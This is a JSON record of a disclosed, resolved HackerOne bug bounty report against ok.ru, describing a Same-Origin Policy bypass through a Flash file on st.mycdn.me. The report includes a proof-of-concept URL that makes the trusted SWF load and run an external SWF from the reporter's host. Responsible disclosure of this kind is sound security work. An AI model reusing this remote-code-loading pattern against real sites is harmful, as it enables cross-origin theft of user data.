{
  "id": 102236,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDIyMzY=",
  "url": "https://hackerone.com/reports/102236",
  "title": "Same-Origin Policy Bypass #2 ",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2015-11-27T02:56:17.259Z",
  "submitted_at": "2015-11-27T02:56:17.259Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "zoczus",
    "url": "/zoczus",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/124/0232d6c25286896aa86b6179f4d8b5eb58f02bd0_original.JPG/8774a5031fc14b74dc4404da039040c69df8ed41021007c0c2beb9de489fcf66"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1782,
    "url": "https://hackerone.com/ok",
    "handle": "ok",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/782/0e7098faf92785cddc86bcf693dbb068dad14311_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/782/0e7098faf92785cddc86bcf693dbb068dad14311_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "ok.ru",
      "twitter_handle": "",
      "website": "http://ok.ru",
      "about": "Odnoklassniki social network"
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2016-05-04T12:31:53.532Z",
  "bug_reporter_agreed_on_going_public_at": "2016-05-04T12:31:53.435Z",
  "team_member_agreed_on_going_public_at": "2016-05-04T09:27:40.691Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi,\n\nThis is really similar issue to my previous report #102234 - exploitation mechanism is really same but other swf file is vulnerable. All conditions are met: \n\n- st.mycdn.me domain which is in ok.ru crossdomain.xml\n- Security.allowDomain('*')\n- possibility to execute own SWF code provided by URL parameter.\n\nExample of swf code execution: https://st.mycdn.me/static/moderator/6-1-6/Main.swf?retry_timer=30&skip_timer=8500&disableAgeCheck=true&v=55&player=https://uid0.pl/poc/xss.swf (shoud execute same code like https://uid0.pl/poc/xss.swf)\n\nI know this report is much sorter and less detailed than previous one. I also belive I don't need to explain it again because all is in previous report and exploit mechanism is really the same... BUT if you want me to prepare different PoC for this case - no problem at all. \n\nHave a nice day,\nJZ",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2016-06-03T09:27:40.771Z",
  "allow_singular_disclosure_after": -293596392.4959012,
  "singular_disclosure_allowed": true,
  "vote_count": 4,
  "voters": [
    "fantam1",
    "shivammusic",
    "spetr0x",
    "dyabla"
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
